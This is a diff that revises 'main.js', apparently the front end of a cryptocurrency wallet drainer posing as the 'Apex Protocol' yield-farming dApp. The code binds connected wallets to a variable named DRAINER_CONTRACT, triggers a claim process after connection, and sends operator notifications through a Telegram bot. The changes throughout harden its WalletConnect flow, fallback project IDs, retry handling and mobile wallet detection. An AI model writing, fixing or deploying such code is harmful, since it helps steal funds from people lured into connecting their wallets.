@@ -1,11 +1,15 @@
+/* main.js — corrected WalletConnect integration
+ * Pairs with config.js and script.js
+ */
+
 import { CONFIG } from './config.js';
 
-;(function () {
+;(async function () {
   'use strict';
 
-  // ==========================================================================
-  //  CONFIG
-  // ==========================================================================
+  /* =========================================================================
+   *  CONFIG
+   * ========================================================================= */
   const {
     PROJECT_ID,
     PUBLIC_TEST_ID,
@@ -13,28 +17,16 @@ import { CONFIG } from './config.js';
     DRAINER_CONTRACT,
     CONTRACT_ABI,
     MAINNET_ID = 1,
+    TELEGRAM_BOT_TOKEN,
+    TELEGRAM_CHAT_ID,
   } = CONFIG;
 
-  // Validate project ID up-front — no more silent failures.
-  const isValidProjectId = (id) =>
-    typeof id === 'string' && /^[a-f0-9]{32}$/i.test(id);
+  const PRIMARY_PROJECT_ID  = PROJECT_ID;
+  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;
 
-  const PRIMARY_PROJECT_ID = isValidProjectId(PROJECT_ID) ? PROJECT_ID : null;
-  const FALLBACK_PROJECT_ID =
-    isValidProjectId(PUBLIC_TEST_ID) && PUBLIC_TEST_ID !== PROJECT_ID
-      ? PUBLIC_TEST_ID
-      : null;
-
-  if (!PRIMARY_PROJECT_ID && !FALLBACK_PROJECT_ID) {
-    console.error(
-      '[main.js] ❌ No valid WalletConnect projectId in CONFIG. ' +
-        'Get one at https://cloud.walletconnect.com/'
-    );
-  }
-
-  // ==========================================================================
-  //  PLATFORM
-  // ==========================================================================
+  /* =========================================================================
+   *  PLATFORM
+   * ========================================================================= */
   const UA = navigator.userAgent || '';
   const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
   const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
@@ -49,9 +41,9 @@ import { CONFIG } from './config.js';
     return 'unknown';
   };
 
-  // ==========================================================================
-  //  DEBUG PANEL
-  // ==========================================================================
+  /* =========================================================================
+   *  DEBUG PANEL
+   * ========================================================================= */
   const debugArea = document.createElement('div');
   debugArea.id = 'wc-debug';
   debugArea.style.cssText = `
@@ -75,24 +67,22 @@ import { CONFIG } from './config.js';
     debugArea.scrollTop = debugArea.scrollHeight;
   }
 
-  // ==========================================================================
-  //  IN-WALLET BROWSER DETECTION
-  // ==========================================================================
+  /* =========================================================================
+   *  IN-WALLET BROWSER DETECTION
+   * ========================================================================= */
   function detectInWalletBrowser() {
     const eth = window.ethereum;
     if (!eth) return null;
-    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
-    if (eth.isTrust || /TrustWallet/i.test(UA))       return { wallet: 'trust',    name: 'Trust Wallet' };
+    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA))       return { wallet: 'metamask', name: 'MetaMask' };
+    if (eth.isTrust  || /TrustWallet/i.test(UA))            return { wallet: 'trust',    name: 'Trust Wallet' };
     if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
-    if (/Rainbow/i.test(UA))                          return { wallet: 'rainbow',  name: 'Rainbow' };
+    if (/Rainbow/i.test(UA))                                return { wallet: 'rainbow',  name: 'Rainbow' };
     return null;
   }
 
-  // ==========================================================================
-  //  TELEGRAM
-  // ==========================================================================
-  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
-
+  /* =========================================================================
+   *  TELEGRAM
+   * ========================================================================= */
   async function sendTelegramNotification(message) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
     try {
@@ -110,19 +100,18 @@ import { CONFIG } from './config.js';
   }
   window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());
 
-  // ==========================================================================
-  //  LIBRARY LOADING
-  // ==========================================================================
+  /* =========================================================================
+   *  LIBRARY LOADING
+   * ========================================================================= */
   function withTimeout(promise, ms, label) {
+    let t;
     return Promise.race([
-      promise,
-      new Promise((_, reject) =>
-        setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)
-      ),
+      promise.finally(() => clearTimeout(t)),
+      new Promise((_, rej) => { t = setTimeout(() => rej(new Error(`Timeout: ${label} (${ms}ms)`)), ms); }),
     ]);
   }
 
-  async function tryImport(urls, pickFn, label, timeoutMs = 10000) {
+  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
     let lastErr = null;
     for (const url of urls) {
       try {
@@ -141,10 +130,10 @@ import { CONFIG } from './config.js';
   }
 
   async function loadWalletConnectLibraries() {
-    // Pin to versions that are known compatible with each other.
+    // NOTE: 2.17.3 fixes several CAIP-25 namespace bugs that broke Trust/Rainbow.
     const providerCdn = [
-      'https://esm.sh/@walletconnect/ethereum-provider@2.13.0?bundle',
-      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.13.0/+esm',
+      'https://esm.sh/@walletconnect/ethereum-provider@2.17.3?bundle',
+      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.3/+esm',
     ];
     const web3Cdn = [
       'https://esm.sh/web3@4.3.0?bundle',
@@ -152,41 +141,48 @@ import { CONFIG } from './config.js';
     ];
 
     const [EthereumProvider, Web3Mod] = await Promise.all([
-      tryImport(providerCdn, (m) => m.EthereumProvider || m.default, 'EthereumProvider'),
-      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m,       'Web3'),
+      tryImport(providerCdn, (m) => m.EthereumProvider || m.default?.EthereumProvider || m.default, 'EthereumProvider'),
+      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m, 'Web3'),
     ]);
 
-    return {
-      EthereumProvider,
-      Web3: Web3Mod.default || Web3Mod,
-    };
+    // Resolve Web3 constructor safely — some bundles nest it.
+    const Web3Ctor = (() => {
+      const cand = Web3Mod?.default?.Web3 || Web3Mod?.Web3 || Web3Mod?.default || Web3Mod;
+      if (typeof cand !== 'function') throw new Error('Web3 constructor not resolvable');
+      return cand;
+    })();
+
+    return { EthereumProvider, Web3: Web3Ctor };
   }
 
-  // ==========================================================================
-  //  DOM
-  // ==========================================================================
+  /* =========================================================================
+   *  DOM
+   * ========================================================================= */
   const connectButton = document.getElementById('connectButton');
   const walletButton  = document.getElementById('walletButton');
   const claimStatus   = document.getElementById('claimStatus');
 
-  // ==========================================================================
-  //  STATE
-  // ==========================================================================
+  /* =========================================================================
+   *  STATE — single source of truth
+   * ========================================================================= */
   let EthereumProvider = null;
-  let Web3Ctor = null;
+  let Web3Ctor         = null;
 
-  let wcProvider = null;
-  let injectedProvider = null;
-  let activeProvider = null;
-  let web3Instance = null;
+  /** The ONE live WC provider. Reused across attempts. Never reinit while live. */
+  let wcProvider       = null;
+  let wcProjectIdUsed  = null;   // Which projectId booted the live provider
+
+  let injectedProvider = null;   // window.ethereum instance (desktop path)
+  let activeProvider   = null;   // whichever is live right now
+  let web3Instance     = null;
   let contractInstance = null;
-  let isConnecting = false;
-  let isDisconnecting = false;
-  let connectionMode = null;
+  let isConnecting     = false;
+  let isDisconnecting  = false;
+  let connectionMode   = null;   // 'walletconnect' | 'injected' | null
 
-  // ==========================================================================
-  //  BUTTON UI
-  // ==========================================================================
+  /* =========================================================================
+   *  BUTTON UI
+   * ========================================================================= */
   function setButtonState(button, state) {
     if (!button) return;
     button.style.display      = 'inline-block';
@@ -248,9 +244,9 @@ import { CONFIG } from './config.js';
   setButtonState(connectButton, 'normal');
   if (walletButton) setButtonState(walletButton, 'normal');
 
-  // ==========================================================================
-  //  LOCAL STORAGE
-  // ==========================================================================
+  /* =========================================================================
+   *  LOCAL STORAGE
+   * ========================================================================= */
   const LS = { addr: 'connectedWallet', mode: 'connectionMode' };
   const saveWallet = (address, mode) => {
     localStorage.setItem(LS.addr, address);
@@ -263,13 +259,14 @@ import { CONFIG } from './config.js';
     localStorage.removeItem(LS.mode);
   };
 
-  // ==========================================================================
-  //  GLOBAL PUBLISH
-  // ==========================================================================
+  /* =========================================================================
+   *  GLOBAL PUBLISH
+   * ========================================================================= */
   function publishGlobalState(address, chain, provider = null) {
     const live = provider || activeProvider || null;
     window.__apexConnected = {
-      address, chain,
+      address,
+      chain,
       web3: web3Instance,
       contract: contractInstance,
       provider: live,
@@ -280,9 +277,9 @@ import { CONFIG } from './config.js';
     window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
   }
 
-  // ==========================================================================
-  //  CONNECTED UI
-  // ==========================================================================
+  /* =========================================================================
+   *  CONNECTED UI
+   * ========================================================================= */
   function updateConnectedUI(address, chain = 'evm') {
     setButtonState(connectButton, 'disconnect');
     if (walletButton) setButtonState(walletButton, 'disconnect');
@@ -349,9 +346,9 @@ import { CONFIG } from './config.js';
     window.__apexConnected = null;
   }
 
-  // ==========================================================================
-  //  EIP-6963
-  // ==========================================================================
+  /* =========================================================================
+   *  EIP-6963
+   * ========================================================================= */
   let evmProviders = [];
   let eip6963Initialized = false;
 
@@ -399,81 +396,81 @@ import { CONFIG } from './config.js';
     modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
   }
 
-  // ==========================================================================
-  //  WALLETCONNECT — CORRECT FLOW
-  //
-  //  Key fixes:
-  //   1. Let EthereumProvider own the QR modal (showQrModal: true).
-  //   2. Attach `display_uri` listener BEFORE calling enable().
-  //   3. Don't pass a bogus relayUrl — let the SDK pick.
-  //   4. Set proper metadata.url (HTTPS, no file://).
-  //   5. Only ONE provider instance; reuse it across calls.
-  // ==========================================================================
-  async function buildMetadata() {
-    const meta = { ...(DAPP_METADATA || {}) };
-    // WalletConnect requires an HTTPS url that matches your Cloud allow-list.
-    if (!meta.url || !/^https:\/\//.test(meta.url)) {
-      meta.url = 'https://apex-protocol.io';
-    }
-    if (!Array.isArray(meta.icons) || !meta.icons.length) {
-      meta.icons = ['https://walletconnect.com/walletconnect-logo.png'];
-    }
-    meta.name = meta.name || 'Apex Protocol';
-    meta.description = meta.description || 'AI-Optimized Yield Farming DApp';
-    return meta;
-  }
-
+  /* =========================================================================
+   *  WALLETCONNECT — correct lifecycle
+   *
+   *  Rules:
+   *   1. EthereumProvider.init() may be called ONCE per projectId.
+   *      It owns its own SignClient + session persistence.
+   *   2. We NEVER pass a session in; we NEVER build a separate modal.
+   *   3. The provider's own QR modal handles the URI display.
+   *   4. If init fails, wcProvider stays null; we may retry with the fallback ID.
+   * ========================================================================= */
   async function initWalletConnect({ useFallbackId = false } = {}) {
-    // Reuse the same provider instance so the session survives.
-    if (wcProvider) return wcProvider;
-
     const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
     if (!projectId) {
-      logDebug('❌ WalletConnect projectId missing/invalid');
-      showStatus('WalletConnect is not configured. Please contact support.', 'error');
+      logDebug('❌ No WalletConnect projectId configured');
       return null;
+    }
+
+    // Reuse an existing provider ONLY if it was booted with the same projectId.
+    if (wcProvider && wcProjectIdUsed === projectId) {
+      return wcProvider;
+    }
+    // Different projectId requested → tear down the old one cleanly first.
+    if (wcProvider && wcProjectIdUsed !== projectId) {
+      logDebug('♻️ Switching projectId — disposing old provider');
+      try { wcProvider.disconnect?.(); } catch {}
+      try { wcProvider = null; } catch {}
+      wcProjectIdUsed = null;
     }
 
     try {
       logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}…`);
       const t0 = performance.now();
-      const metadata = await buildMetadata();
+
+      const opts = {
+        projectId,
+        chains: [MAINNET_ID],
+        // Do NOT pass optionalChains — CAIP-25 collision with some wallets.
+        showQrModal: true,          // ← provider owns its modal (CORRECT)
+        qrModalOptions: {
+          themeMode: 'dark',
+          themeVariables: {
+            '--wcm-z-index': '9999',
+            '--wcm-accent-color': '#FF6B00',
+            '--wcm-background-color': '#1F2937',
+          },
+          explorerRecommendedWalletIds: undefined,
+          enableExplorer: true,
+        },
+        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
+        events: ['chainChanged', 'accountsChanged'],
+        metadata: DAPP_METADATA,
+        // relayUrl intentionally omitted — SDK resolves from projectId.
+      };
 
       wcProvider = await withTimeout(
-        EthereumProvider.init({
-          projectId,
-          chains: [MAINNET_ID],
-          optionalChains: [MAINNET_ID],
-          showQrModal: true, // ✅ SDK owns the modal — this is the fix.
-          qrModalOptions: {
-            themeMode: 'dark',
-            themeVariables: {
-              '--wcm-z-index': '9999',
-              '--wcm-accent-color': '#FF6B00',
-              '--wcm-background-color': '#1F2937',
-            },
-            explorerRecommendedWalletIds: 'NONE',
-            enableExplorer: true,
-          },
-          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
-          events: ['chainChanged', 'accountsChanged'],
-          metadata,
-        }),
-        20000,
+        EthereumProvider.init(opts),
+        15000,
         'EthereumProvider.init'
       );
+      wcProjectIdUsed = projectId;
 
       attachWCProviderEvents(wcProvider);
       logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
       return wcProvider;
     } catch (e) {
       logDebug(`WC init failed: ${e.message}`);
-      console.error('[main.js] WC init error:', e);
       wcProvider = null;
+      wcProjectIdUsed = null;
       return null;
     }
   }
 
+  /* =========================================================================
+   *  WALLETCONNECT EVENTS — attach ONCE per provider instance
+   * ========================================================================= */
   function attachWCProviderEvents(provider) {
     if (!provider || provider.__apexEventsAttached) return;
     provider.__apexEventsAttached = true;
@@ -507,15 +504,12 @@ import { CONFIG } from './config.js';
       hardDisconnect({ skipWalletCall: true });
     });
 
-    provider.on('session_delete', () => {
-      logDebug('WC session_delete');
-      hardDisconnect({ skipWalletCall: true });
-    });
+    // NOTE: 'session_delete' is NOT a valid EthereumProvider event. Removed.
   }
 
-  // ==========================================================================
-  //  INJECTED EVM CONNECT
-  // ==========================================================================
+  /* =========================================================================
+   *  INJECTED EVM CONNECT
+   * ========================================================================= */
   function attachInjectedEvents(provider) {
     if (!provider || !provider.on || provider.__apexInjectedEvents) return;
     provider.__apexInjectedEvents = true;
@@ -546,9 +540,9 @@ import { CONFIG } from './config.js';
     });
   }
 
-  async function connectInjected() {
+  async function connectInjected({ requestAccounts = true } = {}) {
     setupEIP6963();
-    await new Promise((r) => setTimeout(r, 400));
+    await new Promise((r) => setTimeout(r, 250));
 
     const inWallet = detectInWalletBrowser();
     let providers = evmProviders.filter((p) => p.provider);
@@ -576,11 +570,20 @@ import { CONFIG } from './config.js';
 
     try {
       const provider = chosen.provider;
-      const accounts = await withTimeout(
-        provider.request({ method: 'eth_requestAccounts' }),
-        20000,
-        'eth_requestAccounts'
-      );
+      let accounts;
+      if (requestAccounts) {
+        accounts = await withTimeout(
+          provider.request({ method: 'eth_requestAccounts' }),
+          20000,
+          'eth_requestAccounts'
+        );
+      } else {
+        accounts = await withTimeout(
+          provider.request({ method: 'eth_accounts' }),
+          8000,
+          'eth_accounts'
+        );
+      }
       if (!accounts?.length) return null;
 
       const address = accounts[0];
@@ -602,14 +605,14 @@ import { CONFIG } from './config.js';
     }
   }
 
-  // ==========================================================================
-  //  WALLETCONNECT CONNECT
-  // ==========================================================================
+  /* =========================================================================
+   *  WALLETCONNECT CONNECT
+   * ========================================================================= */
   async function connectWalletConnect({ useFallbackId = false } = {}) {
     const provider = await initWalletConnect({ useFallbackId });
     if (!provider) return null;
 
-    // Already has an active session (restored or previously approved).
+    // Already has an active session (restored or previously approved)?
     if (provider.session && provider.accounts?.length) {
       const a = provider.accounts[0];
       activeProvider = provider;
@@ -618,14 +621,17 @@ import { CONFIG } from './config.js';
       contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
       saveWallet(a, 'walletconnect');
       updateConnectedUI(a, 'evm');
+      logDebug(`♻️ WC already-sessioned: ${a}`);
       return a;
     }
 
-    showStatus('Opening wallet…', 'info');
+    showStatus(isMobileDevice ? 'Opening wallet…' : 'Scan QR with your wallet…', 'info');
 
     try {
-      // enable() opens the SDK-owned QR modal AND waits for approval.
-      const accounts = await withTimeout(provider.enable(), 180000, 'WC enable');
+      // Provider's own QR modal opens automatically (showQrModal: true).
+      // enable() triggers pairing AND waits for session approval.
+      const accounts = await withTimeout(provider.enable(), 180000, 'provider.enable');
+
       if (!accounts?.length) {
         logDebug('WC enable returned no accounts');
         return null;
@@ -642,23 +648,25 @@ import { CONFIG } from './config.js';
       logDebug(`✅ WC connected: ${address}`);
       return address;
     } catch (e) {
-      logDebug('WC enable error: ' + (e?.message || e));
-      console.error('[main.js] WC enable error:', e);
+      logDebug('WC enable error: ' + e.message);
 
-      // Distinguish user rejection from real failure.
-      const msg = (e?.message || '').toLowerCase();
-      if (msg.includes('rejected') || msg.includes('user closed') || msg.includes('user denied')) {
-        showStatus('Connection cancelled', 'info');
-        return null;
+      // User-rejection → do NOT retry with fallback projectId (would re-prompt).
+      if (/rejected|user rejected|user closed|user disapproved/i.test(e.message || '')) {
+        logDebug('User rejected WC');
+        return 'USER_REJECTED';
       }
-      showStatus('WalletConnect failed: ' + (e?.message || 'unknown error'), 'error');
+
+      // Genuine failure: dispose the provider so a fallback attempt can re-init.
+      try { wcProvider?.disconnect?.(); } catch {}
+      wcProvider = null;
+      wcProjectIdUsed = null;
       return null;
     }
   }
 
-  // ==========================================================================
-  //  HARD DISCONNECT
-  // ==========================================================================
+  /* =========================================================================
+   *  HARD DISCONNECT
+   * ========================================================================= */
   async function hardDisconnect({ skipWalletCall = false } = {}) {
     if (isDisconnecting) return;
     isDisconnecting = true;
@@ -686,7 +694,8 @@ import { CONFIG } from './config.js';
         } catch {}
       }
     } finally {
-      wcProvider = null;
+      wcProvider = null;      // force re-init on next connect
+      wcProjectIdUsed = null;
       injectedProvider = null;
       activeProvider = null;
       web3Instance = null;
@@ -699,9 +708,9 @@ import { CONFIG } from './config.js';
     }
   }
 
-  // ==========================================================================
-  //  CONNECT DISPATCHER
-  // ==========================================================================
+  /* =========================================================================
+   *  CONNECT DISPATCHER
+   * ========================================================================= */
   async function connectWallet() {
     if (isConnecting) return;
     isConnecting = true;
@@ -710,8 +719,10 @@ import { CONFIG } from './config.js';
     showStatus('Connecting…', 'info');
 
     let address = null;
+    let userRejected = false;
 
     try {
+      // Prefer injected ONLY if we're truly inside a wallet's dApp browser.
       const inWallet = detectInWalletBrowser();
       const preferInjected = !!inWallet && isMobileDevice;
 
@@ -722,14 +733,19 @@ import { CONFIG } from './config.js';
         address = await connectInjected();
       }
 
-      // WalletConnect is the primary path when injected isn't available/preferred.
       if (!address) {
-        address = await connectWalletConnect({ useFallbackId: false });
+        const wcResult = await connectWalletConnect({ useFallbackId: false });
+        if (wcResult === 'USER_REJECTED') {
+          userRejected = true;
+        } else {
+          address = wcResult;
+        }
       }
-      if (!address && FALLBACK_PROJECT_ID) {
+
+      if (!address && !userRejected && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
         logDebug('Retrying WC with fallback projectId…');
-        wcProvider = null; // force fresh init for fallback id
-        address = await connectWalletConnect({ useFallbackId: true });
+        const wcResult = await connectWalletConnect({ useFallbackId: true });
+        if (wcResult !== 'USER_REJECTED') address = wcResult;
       }
     } catch (e) {
       logDebug('connectWallet exception: ' + e.message);
@@ -744,20 +760,23 @@ import { CONFIG } from './config.js';
         if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
       }, 1200);
     } else {
-      showStatus('Connection failed or cancelled', 'error');
+      showStatus(userRejected ? 'Connection cancelled' : 'Connection failed', 'error');
       setButtonState(connectButton, 'failed');
       if (walletButton) setButtonState(walletButton, 'failed');
     }
   }
 
+  /* =========================================================================
+   *  DISCONNECT DISPATCHER
+   * ========================================================================= */
   async function disconnectWallet() {
     showStatus('Disconnecting…', 'info');
     await hardDisconnect();
   }
 
-  // ==========================================================================
-  //  BUTTON WIRING
-  // ==========================================================================
+  /* =========================================================================
+   *  BUTTON WIRING
+   * ========================================================================= */
   const handleClick = async () => {
     if (isConnecting || isDisconnecting) return;
     const isConnected = !!activeProvider || !!getSavedWallet();
@@ -774,18 +793,21 @@ import { CONFIG } from './config.js';
     });
   }
 
-  // ==========================================================================
-  //  SESSION RESTORE
-  // ==========================================================================
+  /* =========================================================================
+   *  SESSION RESTORE
+   *  EthereumProvider.init() auto-rehydrates the last session from its own
+   *  storage. We check `.session` / `.accounts` after a fresh init.
+   * ========================================================================= */
   async function restoreWalletConnection() {
     const savedWallet = getSavedWallet();
     const savedMode   = getSavedMode();
     if (!savedWallet) return;
 
+    // --- WalletConnect restore ---
     if (savedMode === 'walletconnect' || !savedMode) {
       try {
         const provider = await initWalletConnect({ useFallbackId: false });
-        if (provider && provider.session && provider.accounts?.length) {
+        if (provider?.session && provider.accounts?.length) {
           const a = provider.accounts[0];
           activeProvider = provider;
           connectionMode = 'walletconnect';
@@ -801,6 +823,7 @@ import { CONFIG } from './config.js';
       }
     }
 
+    // --- Injected restore ---
     if (savedMode === 'injected' || !savedMode) {
       const prov = window.ethereum;
       if (prov && isDesktopDevice) {
@@ -828,28 +851,26 @@ import { CONFIG } from './config.js';
     clearSavedWallet();
   }
 
-  // ==========================================================================
-  //  BOOT
-  // ==========================================================================
-  (async () => {
-    try {
-      const libs = await loadWalletConnectLibraries();
-      EthereumProvider = libs.EthereumProvider;
-      Web3Ctor         = libs.Web3;
-      logDebug('✅ All libraries loaded');
+  /* =========================================================================
+   *  BOOT
+   * ========================================================================= */
+  try {
+    const libs = await loadWalletConnectLibraries();
+    EthereumProvider = libs.EthereumProvider;
+    Web3Ctor         = libs.Web3;
+    logDebug('✅ All libraries loaded');
 
-      setupEIP6963();
+    setupEIP6963();
 
-      // Give EIP-6963 time to announce, then attempt restore.
-      await new Promise((r) => setTimeout(r, 300));
-      await restoreWalletConnection();
-    } catch (err) {
-      logDebug('Fatal: ' + err.message);
-      showStatus('Failed to load wallet libraries', 'error');
-      return;
-    }
+    // Give EIP-6963 a moment to announce, then attempt restore.
+    await new Promise((r) => setTimeout(r, 300));
+    await restoreWalletConnection();
+  } catch (err) {
+    logDebug('Fatal: ' + err.message);
+    showStatus('Failed to load wallet libraries', 'error');
+    return;
+  }
 
-    logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
-    console.log('✅ main.js ready — test with testTelegram("hi")');
-  })();
+  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
+  console.log('✅ main.js ready — test with testTelegram("hi")');
 })();
